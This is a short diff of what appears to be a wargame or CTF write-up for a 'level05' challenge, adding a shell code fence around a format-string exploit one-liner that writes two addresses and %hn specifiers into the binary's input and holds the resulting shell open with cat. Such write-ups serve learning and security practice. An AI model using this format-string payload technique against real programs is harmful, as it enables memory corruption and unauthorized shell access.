@@ -64,5 +64,6 @@ to reach the middle of the slope we add 24
 | magic  | 57055 |   8472 |
 
 ## the hack
-
+```sh
 (python -c 'print("\xe0\x97\x04\x08" + "\xe2\x97\x04\x08" + "%57055x%10$hn" + "%8472x%11$hn")' ; cat) | ./level05
+```
